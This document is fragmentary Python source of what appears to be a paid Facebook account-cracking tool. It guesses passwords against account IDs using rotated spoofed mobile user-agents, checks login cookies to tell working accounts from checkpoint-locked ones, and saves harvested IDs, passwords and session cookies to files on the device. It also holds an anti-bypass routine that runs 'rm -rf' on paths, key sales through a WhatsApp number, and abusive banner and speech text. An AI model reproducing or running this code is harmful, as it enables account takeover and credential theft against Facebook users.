...
ua = ['Mozilla/5.0 (Linux; U; Android 4.2.2; es-la; ALCATEL ONE TOUCH 5036A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/534.30[FBAN/EMA;FBLC/es_LA;FBAV/40.0.0.5.68;]',]
ua = ['Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; GT-P3100 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/88.0.0.6.182;]',]
ua = ["Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; Lenovo A760 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/91.0.0.6.186;]",]
ua = ['Mozilla/5.0 (Linux; U; Android 4.2.2; uk-ua; C2305 Build/16.0.B.2.16) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/uk_UA;FBAV/87.0.0.7.184;]']
ua = ['Mozilla/5.0 (Linux; U; Android 4.3; fr-fr; Z10 Build/10.3.2.348) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/fr_FR;FBAV/85.0.0.10.176;]']
ua = ['Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; GT-I9060 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/88.0.0.6.182;]']
ua = ['Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; RG310 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]']
ua = ['Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; Lenovo A760 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]']
ua = ['Mozilla/5.0 (Linux; U; Android 4.2.2; en-ph; GT-I9205 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 [FB_IAB/Orca-Android;FBAV/162.0.0.19.90;]']
ua = ["Mozilla/5.0 (Linux; U; Android 4.1.2; uk-ua; GT-I8552 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; XtremePQ15 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; PAP5044DUO Build/PrestigioPAP5044DUO) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/74.0.0.6.186;]",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.1.1; fr-fr; HTC One X+ Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/fr_FR;FBAV/54.0.0.2.86;]",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]",]
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/CenTsuPH/centsu/blob/main/ua.txt').text
        ua=open('bbnew.txt','w')
...
\033[97;1m███████║████████ ██    ███    ████                                                                              
     ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
     ║ \33[0;44m[ F U C K Y O U B Y P A S S E R ]\033[0;92m ║
     ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;27m==================================================
[] AUTHOR       :      cent
[] TOOLS        :      FILE CLONE
...
os.system('espeak -a 300 "HEY BITCH  WELCOME  CLONING TOOLS"')
pass
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\33[1;30m     ====================")
      print("\33[1;36m  [•] 15 Days 50 php ")
      print("\33[1;36m  [•] 30 Days 100 php ")
      print('\33[1;37m=========================================================')
      ...
      tks = ('HEY%20SENPAI%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('xdg-open https://wa.me/+63961851941?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
...
def fucked():
    ...
    os.system(f"rm -rf {y}")
    os.system(f"rm -rf {z}")
    print(' Fuck You Bypass User Security By CENT \ . 0o');exit()
...
def menu():
    ...
    if RIPON in ['111']:
        ...
        os.system('xdg-open https://wa.me/+639641851941')
        os.system("python nono.py")
    elif RIPON in ['3','03']:
        result()
    elif RIPON in ['0']:
...
def crack_file():
    print('\033[0;91m=========================================================')
    os.system('espeak -a 300 " YOUR FILE LOCATION DUMB ASS"')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;91m{bo}[DOWNLOADING%<M1>]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                open('/sdcard/CENTM1•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( uid+' | '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                open('/sdcard/CENTM1•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( uid+' | '+pw+' | '+kuki+'\n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[DOWNLOADING<M2>]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " oh shit Cp ID"')
                open('/sdcard/CENT/M2•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( idf+' | '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 "HEY, BITCH,  YOU,  GOT,  OK,  id"')
                open('/sdcard/CENT/M2•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( uid+' | '+pw+'\n')
                break
